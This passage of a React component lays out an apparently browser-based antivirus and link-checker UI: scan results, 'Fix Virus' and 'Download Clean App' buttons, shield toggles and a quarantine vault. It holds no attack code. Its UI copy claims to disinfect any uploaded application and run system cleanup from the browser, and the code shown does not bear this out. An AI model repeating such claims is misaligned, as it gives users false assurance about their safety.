                className="min-h-[36px] px-4 py-1.5 rounded-full bg-[#34C759] hover:bg-[#28A745] disabled:opacity-50 text-white text-xs font-semibold inline-flex items-center gap-1.5 cursor-pointer transition-colors whitespace-nowrap shadow-xs"
              >
                <Zap
                  size={14}
                  className={isQuickCleaning ? "animate-spin" : ""}
                />
                <span>
                  {isQuickCleaning
                    ? `Quick Cleaning ${quickCleanProgress}%`
                    : "Quick Clean"}
                </span>
              </button>

              <button
                type="button"
                onClick={handleExportAuditReport}
                className={`min-h-[36px] px-3.5 py-1.5 rounded-full text-xs font-semibold inline-flex items-center gap-1.5 cursor-pointer transition-colors whitespace-nowrap ${th.secBtn}`}
              >
                <Download size={13} />
                <span className="hidden sm:inline">Audit Report</span>
              </button>
            </div>
          </div>

          {isQuickCleaning && (
            <div className={`rounded-2xl p-3 space-y-2 ${th.subCard}`}>
              <div className="flex items-center justify-between text-xs font-semibold">
                <span>{quickCleanStage}</span>
                <span className="tabular-nums text-[#34C759]">
                  {quickCleanProgress}%
                </span>
              </div>
              <div className="w-full h-1.5 rounded-full bg-black/10 dark:bg-white/10 overflow-hidden">
                <div
                  style={{ width: `${quickCleanProgress}%` }}
                  className="h-full bg-[#34C759] rounded-full transition-all duration-300"
                />
              </div>
            </div>
          )}

          <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
            {/* Threats Detected */}
            <div className={`rounded-2xl p-3.5 flex items-center gap-3 ${th.subCard}`}>
              <div
                className={`w-10 h-10 rounded-xl flex items-center justify-center shrink-0 ${
                  systemHealthSummary.totalActiveThreats > 0
                    ? "bg-[#FF3B30]/15 text-[#D1202F] dark:text-[#FF6961]"
                    : "bg-[#34C759]/16 text-[#1F8A3B] dark:text-[#32D74B]"
                }`}
              >
                {systemHealthSummary.totalActiveThreats > 0 ? (
                  <ShieldAlert size={20} />
                ) : (
                  <ShieldCheck size={20} />
                )}
              </div>
              <div className="min-w-0">
                <div className={`text-[11px] font-semibold uppercase tracking-wide ${th.muted}`}>
                  Threats Detected
                </div>
                <div className="text-lg font-bold tabular-nums leading-tight mt-0.5">
                  {systemHealthSummary.totalActiveThreats}{" "}
                  <span className={`text-xs font-medium ${th.muted}`}>
                    {scanStats.fixed > 0 ? `(${scanStats.fixed} fixed)` : "active"}
                  </span>
                </div>
              </div>
            </div>

            {/* System Status */}
            <div className={`rounded-2xl p-3.5 flex items-center gap-3 ${th.subCard}`}>
              <div
                className={`w-10 h-10 rounded-xl flex items-center justify-center shrink-0 ${
                  systemHealthSummary.tone === "bad"
                    ? "bg-[#FF3B30]/15 text-[#D1202F] dark:text-[#FF6961]"
                    : systemHealthSummary.tone === "warn"
                      ? "bg-[#FF9F0A]/18 text-[#B85C00] dark:text-[#FF9F0A]"
                      : "bg-[#0071E3]/14 text-[#0071E3] dark:text-[#2997FF]"
                }`}
              >
                <Activity size={20} />
              </div>
              <div className="min-w-0">
                <div className={`text-[11px] font-semibold uppercase tracking-wide ${th.muted}`}>
                  System Status
                </div>
                <div className="text-lg font-bold truncate leading-tight mt-0.5">
                  {systemHealthSummary.systemStatusLabel}
                </div>
              </div>
            </div>

            {/* Last Scan Date */}
            <div className={`rounded-2xl p-3.5 flex items-center gap-3 ${th.subCard}`}>
              <div className="w-10 h-10 rounded-xl bg-[#5E5CE6]/15 text-[#5E5CE6] dark:text-[#7D7AFF] flex items-center justify-center shrink-0">
                <Clock size={20} />
              </div>
              <div className="min-w-0">
                <div className={`text-[11px] font-semibold uppercase tracking-wide ${th.muted}`}>
                  Last Scan Date
                </div>
                <div className="text-sm sm:text-base font-bold truncate leading-tight mt-0.5 tabular-nums">
                  {formatShortDateTime(lastScanIso)}
                </div>
              </div>
            </div>
          </div>
        </section>

        {activeTab === "scan" ? (
          <>
            {/* File Scanner & Application Disinfection Hero */}
            <div
              onDragEnter={(e) => {
                e.preventDefault();
                setIsDragging(true);
              }}
              onDragOver={(e) => {
                e.preventDefault();
                setIsDragging(true);
              }}
              onDragLeave={(e) => {
                if (e.currentTarget === e.target) setIsDragging(false);
              }}
              onDrop={handleDropFiles}
              className={`rounded-[24px] p-6 sm:p-7 grid grid-cols-1 sm:grid-cols-[auto_1fr] gap-6 items-center transition-all ${th.card} ${
                isDragging ? "ring-2 ring-[#0071E3] ring-dashed" : ""
              }`}
            >
              {/* Animated Radial Ring */}
              <div
                style={{ color: ringStrokeColor }}
                className="relative w-[104px] h-[104px] shrink-0"
              >
                <svg
                  className="w-full h-full"
                  viewBox="0 0 100 100"
                  aria-hidden="true"
                >
                  <circle
                    cx="50"
                    cy="50"
                    r="44"
                    fill="none"
                    stroke="currentColor"
                    strokeOpacity="0.16"
                    strokeWidth="6"
                  />
                  <circle
                    cx="50"
                    cy="50"
                    r="44"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="6"
                    strokeLinecap="round"
                    pathLength={100}
                    strokeDasharray={100}
                    strokeDashoffset={100 - heroStatus.pct}
                    transform="rotate(-90 50 50)"
                    className="transition-[stroke-dashoffset] duration-300 ease-out"
                  />
                </svg>
                <span className="absolute inset-0 flex items-center justify-center">
                  {heroStatus.state === "ok" ? (
                    <ShieldCheck size={42} strokeWidth={1.6} />
                  ) : heroStatus.state === "bad" ||
                    heroStatus.state === "warn" ? (
                    <ShieldAlert size={42} strokeWidth={1.6} />
                  ) : (
                    <Shield size={42} strokeWidth={1.6} />
                  )}
                </span>
              </div>

              <div className="min-w-0">
                <h1 className="text-[24px] sm:text-[28px] font-bold tracking-tight leading-tight">
                  {heroStatus.title}
                </h1>
                <p className={`mt-1.5 text-[14px] sm:text-[15px] max-w-[56ch] ${th.muted}`}>
                  {heroStatus.sub}
                </p>

                {scanStats.total > 0 && !scanning && (
                  <div className="flex flex-wrap gap-2 mt-3.5">
                    <span
                      className={`text-xs font-semibold px-3 py-1 rounded-full tabular-nums ${
                        darkMode
                          ? "bg-[#2C2C2E] text-[#98989F]"
                          : "bg-[#787880]/14 text-[#6E6E73]"
                      }`}
                    >
                      {scanStats.total} scanned
                    </span>
                    {scanStats.bad > 0 && (
                      <span className="text-xs font-semibold px-3 py-1 rounded-full tabular-nums bg-[#FF3B30]/14 text-[#D1202F] dark:text-[#FF6961]">
                        {scanStats.bad} threat{scanStats.bad > 1 ? "s" : ""}
                      </span>
                    )}
                    {scanStats.warn > 0 && (
                      <span className="text-xs font-semibold px-3 py-1 rounded-full tabular-nums bg-[#FF9F0A]/18 text-[#B85C00] dark:text-[#FF9F0A]">
                        {scanStats.warn} suspicious
                      </span>
                    )}
                    {scanStats.ok > 0 && (
                      <span className="text-xs font-semibold px-3 py-1 rounded-full tabular-nums bg-[#34C759]/16 text-[#1F8A3B] dark:text-[#32D74B]">
                        {scanStats.ok} clean
                      </span>
                    )}
                    {scanStats.fixed > 0 && (
                      <span className="text-xs font-semibold px-3 py-1 rounded-full tabular-nums bg-[#0071E3]/14 text-[#0071E3] dark:text-[#2997FF]">
                        {scanStats.fixed} fixed
                      </span>
                    )}
                  </div>
                )}

                <div className="flex flex-wrap items-center gap-2.5 mt-4.5">
                  <button
                    type="button"
                    disabled={scanning}
                    onClick={() => fileInputRef.current?.click()}
                    className="min-h-[44px] px-5 py-2.5 rounded-full bg-[#0071E3] hover:bg-[#0062C4] disabled:opacity-45 text-white font-semibold text-sm inline-flex items-center gap-2 cursor-pointer transition-colors"
                  >
                    <FileSearch size={16} />
                    <span>Upload app / files</span>
                  </button>

                  <button
                    type="button"
                    disabled={scanning}
                    onClick={() => folderInputRef.current?.click()}
                    className={`min-h-[44px] px-5 py-2.5 rounded-full font-semibold text-sm inline-flex items-center gap-2 cursor-pointer transition-colors disabled:opacity-45 ${th.secBtn}`}
                  >
                    <FolderOpen size={16} />
                    <span>Scan folder</span>
                  </button>

                  <button
                    type="button"
                    disabled={scanning}
                    onClick={() => void scanFileList(buildDemoFiles())}
                    className="min-h-[44px] px-3 py-2.5 rounded-full font-semibold text-sm text-[#0071E3] dark:text-[#2997FF] hover:underline inline-flex items-center gap-1.5 cursor-pointer disabled:opacity-45"
                  >
                    <Sparkles size={15} />
                    <span>Try a demo</span>
                  </button>
                </div>
              </div>
            </div>

            <input
              ref={fileInputRef}
              type="file"
              multiple
              hidden
              onChange={(e) => {
                const list = e.target.files ? Array.from(e.target.files) : [];
                e.target.value = "";
                void scanFileList(list);
              }}
            />
            <input
              ref={folderInputRef}
              type="file"
              multiple
              hidden
              {...({
                webkitdirectory: "",
              } as React.InputHTMLAttributes<HTMLInputElement>)}
              onChange={(e) => {
                const list = e.target.files ? Array.from(e.target.files) : [];
                e.target.value = "";
                void scanFileList(list);
              }}
            />

            {/* Results Section */}
            {sortedResults.length > 0 && (
              <div className="space-y-2.5">
                <div className="flex flex-wrap items-center justify-between gap-2 px-1">
                  <h2 className="text-xl font-bold tracking-tight">
                    Scan Results &amp; Virus Fixer
                  </h2>
                  <div className="flex items-center gap-2">
                    {scanStats.bad + scanStats.warn > 0 && (
                      <button
                        type="button"
                        onClick={() => void handleFixAllThreats()}
                        className="min-h-[34px] px-4 py-1.5 rounded-full bg-[#34C759] hover:bg-[#28A745] text-white text-xs font-semibold inline-flex items-center gap-1.5 cursor-pointer transition-colors shadow-xs"
                      >
                        <Wrench size={13} />
                        <span>
                          Fix All Threats ({scanStats.bad + scanStats.warn})
                        </span>
                      </button>
                    )}
                    <button
                      type="button"
                      onClick={() => {
                        setResults([]);
                        setOpenKeys({});
                      }}
                      className={`min-h-[34px] px-3.5 py-1.5 rounded-full text-xs font-semibold cursor-pointer transition-colors ${th.secBtn}`}
                    >
                      Clear results
                    </button>
                  </div>
                </div>

                <ul
                  className={`rounded-[18px] overflow-hidden divide-y ${th.card} ${th.divider}`}
                >
                  {sortedResults.map((r) => {
                    const key = `f:${r.id}`;
                    const isOpen = Boolean(openKeys[key]);
                    const palette = badgePalette(r.level, r.cleaned);
                    const isFixing = Boolean(fixingIds[r.id]);
                    const canFix =
                      !r.cleaned && (r.level === "bad" || r.level === "warn");

                    return (
                      <li key={r.id}>
                        <div className="w-full flex flex-wrap sm:flex-nowrap items-center gap-3 px-4 py-3 min-h-[60px] hover:bg-black/[0.02] dark:hover:bg-white/[0.03] transition-colors">
                          <button
                            type="button"
                            onClick={() =>
                              setOpenKeys((prev) => ({
                                ...prev,
                                [key]: !prev[key],
                              }))
                            }
                            aria-expanded={isOpen}
                            className="flex-1 min-w-0 flex items-center gap-3 text-left cursor-pointer"
                          >
                            <span
                              className={`w-[38px] h-[38px] rounded-[11px] flex items-center justify-center shrink-0 ${palette.chip}`}
                            >
                              {r.cleaned ? (
                                <CheckCircle2 size={18} />
                              ) : r.level === "bad" || r.level === "warn" ? (
                                <AlertTriangle size={18} />
                              ) : (
                                <ShieldCheck size={18} />
                              )}
                            </span>

                            <span className="flex-1 min-w-0">
                              <span className="block font-semibold text-sm break-all leading-snug">
                                {r.name}
                              </span>
                              <span
                                className={`block text-xs truncate ${th.muted}`}
                              >
                                {r.demo && (
                                  <em className="not-italic font-semibold text-[#0071E3] dark:text-[#2997FF]">
                                    Demo ·{" "}
                                  </em>
                                )}
                                {r.cleaned && (
                                  <em className="not-italic font-semibold text-[#1F8A3B] dark:text-[#32D74B]">
                                    Disinfected ·{" "}
                                  </em>
                                )}
                                {r.dir}
                                {formatBytes(r.size)}
                              </span>
                            </span>
                          </button>

                          <div className="flex items-center gap-2 shrink-0 ml-auto">
                            {canFix && r.rawBytes && (
                              <button
                                type="button"
                                disabled={isFixing}
                                onClick={() => void handleFixFile(r)}
                                className="min-h-[32px] px-3 py-1 rounded-full bg-[#34C759] hover:bg-[#28A745] text-white text-xs font-semibold inline-flex items-center gap-1 cursor-pointer transition-colors whitespace-nowrap"
                              >
                                <Wrench
                                  size={12}
                                  className={isFixing ? "animate-spin" : ""}
                                />
                                <span>
                                  {isFixing ? "Fixing…" : "Fix Virus"}
                                </span>
                              </button>
                            )}

                            {r.cleaned && r.rawBytes && (
                              <button
                                type="button"
                                onClick={() =>
                                  downloadBlobBytes(
                                    r.name,
                                    r.rawBytes!,
                                    r.mimeType,
                                  )
                                }
                                className="min-h-[32px] px-3 py-1 rounded-full bg-[#0071E3] hover:bg-[#0062C4] text-white text-xs font-semibold inline-flex items-center gap-1 cursor-pointer transition-colors whitespace-nowrap"
                              >
                                <Download size={12} />
                                <span>Download</span>
                              </button>
                            )}

                            <span
                              className={`px-2.5 py-1 rounded-full text-xs font-semibold whitespace-nowrap ${palette.chip}`}
                            >
                              {palette.label}
                            </span>

                            <button
                              type="button"
                              onClick={() =>
                                setOpenKeys((prev) => ({
                                  ...prev,
                                  [key]: !prev[key],
                                }))
                              }
                              aria-label="Toggle details"
                              className="p-1 cursor-pointer"
                            >
                              {isOpen ? (
                                <ChevronDown size={16} className={th.muted} />
                              ) : (
                                <ChevronRight size={16} className={th.muted} />
                              )}
                            </button>
                          </div>
                        </div>

                        {isOpen && (
                          <div className="px-4 sm:pl-[66px] pb-4 space-y-3">
                            {r.findings.length > 0 ? (
                              <ul className="space-y-2.5">
                                {r.findings.map((f, idx) => (
                                  <li
                                    key={idx}
                                    className="grid grid-cols-[10px_1fr] gap-2.5 items-start"
                                  >
                                    <span
                                      className={`w-2 h-2 rounded-full mt-1.5 ${dotColor(f.lv)}`}
                                    />
                                    <div className="text-sm">
                                      <div className="font-semibold">{f.t}</div>
                                      <div className={`text-xs mt-0.5 ${th.muted}`}>
                                        {f.d}
                                      </div>
                                    </div>
                                  </li>
                                ))}
                              </ul>
                            ) : (
                              <p className={`text-sm ${th.muted}`}>
                                No known signatures, disguised file types or
                                suspicious script patterns were found.
                              </p>
                            )}

                            {r.hash && (
                              <div
                                className={`font-mono text-xs break-all px-3 py-2 rounded-xl ${th.subCard} ${th.muted}`}
                              >
                                SHA-256 {r.hash}
                              </div>
                            )}

                            <div className="flex flex-wrap gap-2">
                              {canFix && r.rawBytes && (
                                <button
                                  type="button"
                                  disabled={isFixing}
                                  onClick={() => void handleFixFile(r)}
                                  className="min-h-[34px] px-4 py-1.5 rounded-full bg-[#34C759] hover:bg-[#28A745] text-white text-xs font-semibold inline-flex items-center gap-1.5 cursor-pointer"
                                >
                                  <Wrench size={13} />
                                  <span>
                                    {isFixing
                                      ? "Disinfecting…"
                                      : "Fix Virus & Clean App"}
                                  </span>
                                </button>
                              )}

                              {r.rawBytes && (r.cleaned || r.level === "clean") && (
                                <button
                                  type="button"
                                  onClick={() =>
                                    downloadBlobBytes(
                                      r.name,
                                      r.rawBytes!,
                                      r.mimeType,
                                    )
                                  }
                                  className="min-h-[34px] px-4 py-1.5 rounded-full bg-[#0071E3] hover:bg-[#0062C4] text-white text-xs font-semibold inline-flex items-center gap-1.5 cursor-pointer"
                                >
                                  <Download size={13} />
                                  <span>
                                    {r.cleaned
                                      ? "Download Clean App"
                                      : "Download Verified File"}
                                  </span>
                                </button>
                              )}

                              {(r.level === "bad" || r.level === "warn") && (
                                <button
                                  type="button"
                                  onClick={() => handleQuarantineFile(r)}
                                  className={`min-h-[34px] px-3.5 py-1.5 rounded-full text-xs font-semibold inline-flex items-center gap-1.5 cursor-pointer ${th.secBtn}`}
                                >
                                  <Archive size={13} />
                                  <span>Quarantine</span>
                                </button>
                              )}

                              {r.hash && (
                                <a
                                  href={`https://www.virustotal.com/gui/file/${r.hash}`}
                                  target="_blank"
                                  rel="noopener noreferrer"
                                  className={`min-h-[34px] px-3.5 py-1.5 rounded-full text-xs font-semibold inline-flex items-center gap-1.5 ${th.secBtn}`}
                                >
                                  <span>VirusTotal Hash</span>
                                  <ExternalLink size={12} />
                                </a>
                              )}

                              <button
                                type="button"
                                onClick={() => {
                                  const txt = [
                                    r.name,
                                    `Verdict: ${palette.label}`,
                                    `Size: ${formatBytes(r.size)}`,
                                    r.hash ? `SHA-256: ${r.hash}` : "",
                                    ...r.findings.map((f) => `- ${f.t}: ${f.d}`),
                                  ]
                                    .filter(Boolean)
                                    .join("\n");
                                  void copyText(txt);
                                }}
                                className={`min-h-[34px] px-3.5 py-1.5 rounded-full text-xs font-semibold inline-flex items-center gap-1.5 cursor-pointer ${th.secBtn}`}
                              >
                                <Copy size={13} />
                                <span>Copy details</span>
                              </button>

                              <button
                                type="button"
                                onClick={() => {
                                  setResults((prev) =>
                                    prev.filter((x) => x.id !== r.id),
                                  );
                                  showToast("Removed from list.");
                                }}
                                className={`min-h-[34px] px-3.5 py-1.5 rounded-full text-xs font-semibold inline-flex items-center gap-1.5 cursor-pointer ${th.secBtn}`}
                              >
                                <Trash2 size={13} />
                                <span>Remove</span>
                              </button>
                            </div>
                          </div>
                        )}
                      </li>
                    );
                  })}
                </ul>
              </div>
            )}

            {/* Flagged File Removal Steps */}
            {(scanStats.bad > 0 || scanStats.warn > 0) && (
              <div className={`rounded-[18px] p-4 sm:p-5 ${th.card}`}>
                <details>
                  <summary className="font-semibold text-sm text-[#0071E3] dark:text-[#2997FF] cursor-pointer">
                    How to remove a flagged file on your OS
                  </summary>
                  <ol
                    className={`mt-3 list-decimal pl-5 space-y-1.5 text-sm ${th.muted}`}
                  >
                    <li>
                      <strong className="font-semibold">Windows:</strong>{" "}
                      select the file, press Delete, then empty the Recycle Bin.
                      Open Windows Security → Virus &amp; threat protection, and
                      run a Quick scan.
                    </li>
                    <li>
                      <strong className="font-semibold">Mac:</strong> drag the
                      file to the Bin and choose Empty Bin. Remove unknown apps
                      from Applications.
                    </li>
                    <li>
                      <strong className="font-semibold">Android:</strong> open
                      Files, long-press the file and tap Delete. In Play Store,
                      open Play Protect and tap Scan.
                    </li>
                    <li>
                      <strong className="font-semibold">
                        iPhone and iPad:
                      </strong>{" "}
                      delete the file in Files. Under Settings → General → VPN
                      &amp; Device Management, remove any unrecognized profile.
                    </li>
                  </ol>
                </details>
              </div>
            )}

            {/* Honest Scope Note */}
            <div className={`rounded-[18px] p-5 space-y-2 ${th.card}`}>
              <h3 className="text-base font-semibold">
                Upload, Fix &amp; Download Protection Capabilities
              </h3>
              <ul className={`list-disc pl-5 space-y-1.5 text-sm ${th.muted}`}>
                <li>
                  Upload any application, script, archive, or document on-device:
                  checks SHA-256 hashes, EICAR signatures, disguised headers,
                  double extensions, VBA macros, PDF triggers, and obfuscated
                  scripts.
                </li>
                <li>
                  Click <strong>Fix Virus</strong> on any infected item to strip
                  malware payloads, remove hidden spoofing extensions,
                  neutralize dangerous script directives, recompute SHA-256, and{" "}
                  <strong>download the clean file</strong> directly.
                </li>
                <li>
                  Nothing is uploaded to any server — every scan and repair runs
                  100% locally in browser memory.
                </li>
              </ul>
            </div>
          </>
        ) : activeTab === "links" ? (
          /* LINKS TAB */
          <>
            <div className="space-y-2 px-1">
              <h1 className="text-3xl font-bold tracking-tight">
                Is this link safe?
              </h1>
              <p className={`text-[15px] max-w-[62ch] ${th.muted}`}>
                Paste one or more links. Each one is checked on this device for
                look-alike domains, hidden destinations, risky downloads and
                phishing patterns.
              </p>
            </div>

            <form
              onSubmit={handleAddLinkSubmit}
              className={`rounded-[16px] p-1.5 pl-4 flex items-center gap-2 ${th.card}`}
            >
              <Link2 size={18} className={`shrink-0 ${th.muted}`} />
              <input
                type="text"
                inputMode="url"
                autoCapitalize="off"
                spellCheck={false}
                value={linkInput}
                onChange={(e) => setLinkInput(e.target.value)}
                placeholder="Paste a link, for example https://example.com"
                aria-label="Link to check"
                className="flex-1 min-w-0 bg-transparent border-0 outline-none text-sm sm:text-base py-2"
              />
              <button
                type="submit"
                className="min-h-[42px] px-5 rounded-full bg-[#0071E3] hover:bg-[#0062C4] text-white font-semibold text-sm cursor-pointer transition-colors shrink-0"
              >
                Check
              </button>
            </form>

            <div className="space-y-3">
              <div className="flex items-center justify-between px-1">
                <h2 className="text-xl font-bold tracking-tight">Your links</h2>
                <span
                  className={`text-xs font-semibold px-3 py-1 rounded-full tabular-nums ${
                    linkRows.bad
                      ? "bg-[#FF3B30]/14 text-[#D1202F] dark:text-[#FF6961]"
                      : linkRows.warn
                        ? "bg-[#FF9F0A]/18 text-[#B85C00] dark:text-[#FF9F0A]"
                        : linkRows.total
                          ? "bg-[#34C759]/16 text-[#1F8A3B] dark:text-[#32D74B]"
                          : "bg-[#787880]/14 text-[#6E6E73]"
                  }`}
                >
                  {!linkRows.total
                    ? "0 links"
                    : linkRows.bad
                      ? `${linkRows.bad} dangerous`
                      : linkRows.warn
                        ? `${linkRows.warn} to review`
                        : `${linkRows.total} look fine`}
                </span>
              </div>

              <ul
                className={`rounded-[18px] overflow-hidden divide-y ${th.card} ${th.divider}`}
              >
                {linkRows.rows.length > 0 ? (
                  linkRows.rows.map((item) => {
                    const a = item.analysis;
                    const key = `l:${item.raw}`;
                    const isOpen = Boolean(openKeys[key]);
                    const palette = badgePalette(a.level);
                    const vtUrl = `https://www.virustotal.com/gui/search/${encodeURIComponent(item.raw)}`;
                    const sbUrl = `https://transparencyreport.google.com/safe-browsing/search?url=${encodeURIComponent(item.raw)}`;
                    const verdictMsg =
                      a.level === "bad"
                        ? "Do not open this link or enter any details on it."
                        : a.level === "warn"
                          ? "Open only if you know who sent it and expected it."
                          : a.level === "ok"
                            ? "No warning signs in the address itself."
                            : "";

                    return (
                      <li key={`${item.isEx ? "ex" : "my"}-${item.raw}`}>
                        <button
                          type="button"
                          onClick={() =>
                            setOpenKeys((prev) => ({
                              ...prev,
                              [key]: !prev[key],
                            }))
                          }
                          aria-expanded={isOpen}
                          className="w-full flex items-center gap-3 px-4 py-3 min-h-[60px] text-left cursor-pointer hover:bg-black/[0.02] dark:hover:bg-white/[0.03] transition-colors"
                        >
                          <span
                            className={`w-[38px] h-[38px] rounded-[11px] flex items-center justify-center shrink-0 ${palette.chip}`}
                          >
                            <Link2 size={18} />
                          </span>
                          <span className="flex-1 min-w-0">
                            <span className="block font-semibold text-sm break-all leading-snug">
                              {a.host}
                            </span>
                            <span
                              className={`block text-xs truncate ${th.muted}`}
                            >
                              {item.isEx && (
                                <em className="not-italic font-semibold text-[#0071E3] dark:text-[#2997FF]">
                                  Example ·{" "}
                                </em>
                              )}
                              {a.rest || "Root path"}
                            </span>
                          </span>

                          <span
                            className={`px-2.5 py-1 rounded-full text-xs font-semibold whitespace-nowrap shrink-0 ${palette.chip}`}
                          >
                            {palette.label}
                          </span>

                          {isOpen ? (
                            <ChevronDown
                              size={16}
                              className={`shrink-0 ${th.muted}`}
                            />
                          ) : (
                            <ChevronRight
                              size={16}
                              className={`shrink-0 ${th.muted}`}
                            />
                          )}
                        </button>

                        {isOpen && (
                          <div className="px-4 sm:pl-[66px] pb-4 space-y-3">
                            {verdictMsg && (
                              <p className="text-sm font-semibold">
                                {verdictMsg}
                              </p>
                            )}

                            <ul className="space-y-2.5">
                              {a.findings.map((f, idx) => (
                                <li
                                  key={idx}
                                  className="grid grid-cols-[10px_1fr] gap-2.5 items-start"
                                >
                                  <span
                                    className={`w-2 h-2 rounded-full mt-1.5 ${dotColor(f.lv)}`}
                                  />
                                  <div className="text-sm">
                                    <div className="font-semibold">{f.t}</div>
                                    <div className={`text-xs mt-0.5 ${th.muted}`}>
                                      {f.d}
                                    </div>
                                  </div>
                                </li>
                              ))}
                            </ul>

                            <div
                              className={`font-mono text-xs break-all px-3 py-2 rounded-xl ${th.subCard} ${th.muted}`}
                            >
                              {item.raw}
                            </div>

                            <div className="flex flex-wrap gap-2">
                              {a.level !== "invalid" && (
                                <>
                                  <a
                                    href={vtUrl}
                                    target="_blank"
                                    rel="noopener noreferrer"
                                    className={`min-h-[34px] px-3.5 py-1.5 rounded-full text-xs font-semibold inline-flex items-center gap-1.5 transition-colors ${th.secBtn}`}
                                  >
                                    <span>VirusTotal</span>
                                    <ExternalLink size={12} />
                                  </a>
                                  <a
                                    href={sbUrl}
                                    target="_blank"
                                    rel="noopener noreferrer"
                                    className={`min-h-[34px] px-3.5 py-1.5 rounded-full text-xs font-semibold inline-flex items-center gap-1.5 transition-colors ${th.secBtn}`}
                                  >
                                    <span>Safe Browsing</span>
                                    <ExternalLink size={12} />
                                  </a>
                                </>
                              )}

                              <button
                                type="button"
                                onClick={() => void copyText(item.raw)}
                                className={`min-h-[34px] px-3.5 py-1.5 rounded-full text-xs font-semibold inline-flex items-center gap-1.5 cursor-pointer ${th.secBtn}`}
                              >
                                <Copy size={13} />
                                <span>Copy link</span>
                              </button>

                              <button
                                type="button"
                                onClick={() => {
                                  if (item.isEx) {
                                    setExampleLinks((prev) =>
                                      prev.filter((x) => x !== item.raw),
                                    );
                                  } else {
                                    setMyLinks((prev) =>
                                      prev.filter((x) => x !== item.raw),
                                    );
                                  }
                                }}
                                className={`min-h-[34px] px-3.5 py-1.5 rounded-full text-xs font-semibold inline-flex items-center gap-1.5 cursor-pointer ${th.secBtn}`}
                              >
                                <Trash2 size={13} />
                                <span>Remove</span>
                              </button>
                            </div>
                          </div>
                        )}
                      </li>
                    );
                  })
                ) : (
                  <li className={`px-5 py-7 text-sm ${th.muted}`}>
                    No links yet. Paste one above to check it.
                  </li>
                )}
              </ul>

              {(exampleLinks.length > 0 || myLinks.length > 0) && (
                <div className="flex flex-wrap gap-2 px-1">
                  {exampleLinks.length > 0 && (
                    <button
                      type="button"
                      onClick={() => setExampleLinks([])}
                      className={`min-h-[34px] px-3.5 py-1.5 rounded-full text-xs font-semibold cursor-pointer ${th.secBtn}`}
                    >
                      Remove examples
                    </button>
                  )}
                  {myLinks.length > 0 && (
                    <button
                      type="button"
                      onClick={() => setMyLinks([])}
                      className="min-h-[34px] px-3.5 py-1.5 rounded-full bg-[#FF3B30]/12 text-[#D1202F] dark:text-[#FF6961] text-xs font-semibold cursor-pointer hover:bg-[#FF3B30]/20"
                    >
                      Clear my links
                    </button>
                  )}
                </div>
              )}
            </div>

            <div className={`rounded-[18px] p-5 space-y-2 ${th.card}`}>
              <h3 className="text-base font-semibold">About these results</h3>
              <ul className={`list-disc pl-5 space-y-1.5 text-sm ${th.muted}`}>
                <li>
                  The check reads the address itself. It does not open the page,
                  so a new scam on a clean-looking address can still pass.
                </li>
                <li>
                  For a second opinion, use the VirusTotal and Google Safe
                  Browsing buttons on each link. They open in a new tab.
                </li>
                <li>
                  Even a trusted site can host a bad page. Never enter passwords
                  or OTPs from a link you didn&apos;t expect.
                </li>
              </ul>
            </div>
          </>
        ) : (
          /* ADVANCED SHIELD & QUARANTINE VAULT TAB */
          <div className="space-y-5">
            {/* Real-Time Shield Engines */}
            <div className={`rounded-[22px] p-5 sm:p-6 space-y-4 ${th.card}`}>
              <div className="flex flex-wrap items-center justify-between gap-3">
                <div>
                  <h2 className="text-xl font-bold tracking-tight">
                    Real-Time Shield Modules
                  </h2>
                  <p className={`text-xs mt-0.5 ${th.muted}`}>
                    Configure live radar monitoring, automatic virus cleaning,
                    and deep heuristic sensitivity.
                  </p>
                </div>
                <button
                  type="button"
                  onClick={() => void handleQuickClean()}
                  disabled={isQuickCleaning}
                  className="min-h-[36px] px-4 rounded-full bg-[#34C759] hover:bg-[#28A745] text-white text-xs font-semibold inline-flex items-center gap-1.5 cursor-pointer"
                >
                  <RefreshCw
                    size={13}
                    className={isQuickCleaning ? "animate-spin" : ""}
                  />
                  <span>Run System Cleanup</span>
                </button>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                {[
                  {
                    title: "Live System Scan Line",
                    desc: "Persistent animated radar sweep monitoring active viewport.",
                    val: radarActive,
                    toggle: () => setRadarActive((v) => !v),
                  },
                  {
                    title: "Behavioral Script Shield",
                    desc: "Inspects PowerShell, JS obfuscation, shells, and startup keys.",
                    val: behavioralShield,
                    toggle: () => setBehavioralShield((v) => !v),
                  },
                  {
                    title: "Auto-Fix on Upload",
                    desc: "Automatically disinfect threats as soon as applications are uploaded.",
                    val: autoNeutralizeMode,
                    toggle: () => setAutoNeutralizeMode((v) => !v),
                  },
                  {
                    title: "Deep Entropy & Packed Check",
                    desc: "Flags encrypted executables & low-severity runnable shortcuts.",
                    val: highSensitivity,
                    toggle: () => setHighSensitivity((v) => !v),
                  },
                ].map((mod) => (
                  <div
                    key={mod.title}
                    className={`rounded-2xl p-4 flex items-center justify-between gap-3 ${th.subCard}`}
                  >
                    <div className="min-w-0">
                      <div className="text-sm font-semibold">{mod.title}</div>
                      <div className={`text-xs mt-0.5 ${th.muted}`}>
                        {mod.desc}
                      </div>
                    </div>
                    <button
                      type="button"
                      role="switch"
                      aria-checked={mod.val}
                      onClick={mod.toggle}
                      className={`w-12 h-7 rounded-full p-1 transition-colors cursor-pointer shrink-0 ${
                        mod.val
                          ? "bg-[#34C759]"
                          : "bg-black/20 dark:bg-white/20"
                      }`}
                    >
                      <span
                        className={`block w-5 h-5 rounded-full bg-white shadow transition-transform ${
                          mod.val ? "translate-x-5" : "translate-x-0"
                        }`}
                      />
                    </button>
                  </div>
                ))}
              </div>
            </div>

            {/* Quarantine Vault */}
            <div className={`rounded-[22px] p-5 sm:p-6 space-y-4 ${th.card}`}>
              <div className="flex items-center justify-between gap-2">
                <div className="flex items-center gap-2.5">
                  <div className="w-9 h-9 rounded-xl bg-[#FF9F0A]/18 text-[#B85C00] dark:text-[#FF9F0A] flex items-center justify-center">
                    <Lock size={18} />
                  </div>
                  <div>
                    <h2 className="text-lg font-bold tracking-tight">
                      Quarantine Vault ({vaultItems.length})
                    </h2>
                    <p className={`text-xs ${th.muted}`}>
                      Isolated flagged files held safely offline. Restore to clean
                      or purge forever.
                    </p>
                  </div>
                </div>
                {vaultItems.length > 0 && (
                  <button
                    type="button"
                    onClick={() => {
                      setVaultItems([]);
                      showToast("Quarantine Vault emptied");
                    }}
                    className="min-h-[34px] px-3.5 rounded-full bg-[#FF3B30]/12 text-[#D1202F] dark:text-[#FF6961] text-xs font-semibold cursor-pointer"
                  >
                    Purge All
                  </button>
                )}
              </div>

